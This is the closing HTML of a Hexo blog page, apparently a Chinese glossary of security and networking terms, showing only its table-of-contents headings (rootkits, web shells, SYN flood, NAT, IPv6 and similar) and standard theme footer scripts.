class="nav-item nav-level-3"><a class="nav-link" href="#6-dll文件是什么意思，有什么用？"><span class="nav-number">6.0.5.</span> <span class="nav-text">6.dll文件是什么意思，有什么用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-0day漏洞"><span class="nav-number">6.0.6.</span> <span class="nav-text">7.0day漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-Rootkit是什么意思"><span class="nav-number">6.0.7.</span> <span class="nav-text">8.Rootkit是什么意思</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-蜜罐"><span class="nav-number">6.0.8.</span> <span class="nav-text">9.蜜罐</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-ssh"><span class="nav-number">6.0.9.</span> <span class="nav-text">10.ssh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-DDOS"><span class="nav-number">6.0.10.</span> <span class="nav-text">11.DDOS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-震网病毒："><span class="nav-number">6.0.11.</span> <span class="nav-text">12.震网病毒：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-一句话木马"><span class="nav-number">6.0.12.</span> <span class="nav-text">13.一句话木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-Https的作用"><span class="nav-number">6.0.13.</span> <span class="nav-text">14.Https的作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-手工查找后门木马的小技巧"><span class="nav-number">6.0.14.</span> <span class="nav-text">15.手工查找后门木马的小技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-描述OSI（开放系统互联基本参考模型）七层结构"><span class="nav-number">6.0.15.</span> <span class="nav-text">16.描述OSI（开放系统互联基本参考模型）七层结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-TCP和UDP的区别"><span class="nav-number">6.0.16.</span> <span class="nav-text">17.TCP和UDP的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-脱壳"><span class="nav-number">6.0.17.</span> <span class="nav-text">18.脱壳</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-“人肉搜索”"><span class="nav-number">6.0.18.</span> <span class="nav-text">19.“人肉搜索”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-SYN-Flood的基本原理"><span class="nav-number">6.0.19.</span> <span class="nav-text">20.SYN Flood的基本原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-什么是手机”越狱“"><span class="nav-number">6.0.20.</span> <span class="nav-text">21.什么是手机”越狱“</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-主机被入侵，你会如何处理这件事自查解决方案："><span class="nav-number">6.0.21.</span> <span class="nav-text">22.主机被入侵，你会如何处理这件事自查解决方案：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-NAT（网络地址转换）协议"><span class="nav-number">6.0.22.</span> <span class="nav-text">23. NAT（网络地址转换）协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#24-内网穿透"><span class="nav-number">6.0.23.</span> <span class="nav-text">24.内网穿透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#25-虚拟专用网络"><span class="nav-number">6.0.24.</span> <span class="nav-text">25.虚拟专用网络</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#26-二层交换机"><span class="nav-number">6.0.25.</span> <span class="nav-text">26.二层交换机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#27-路由技术"><span class="nav-number">6.0.26.</span> <span class="nav-text">27.路由技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#28-三层交换机"><span class="nav-number">6.0.27.</span> <span class="nav-text">28.三层交换机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#29-IPv6地址表示"><span class="nav-number">6.0.28.</span> <span class="nav-text">29.IPv6地址表示</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
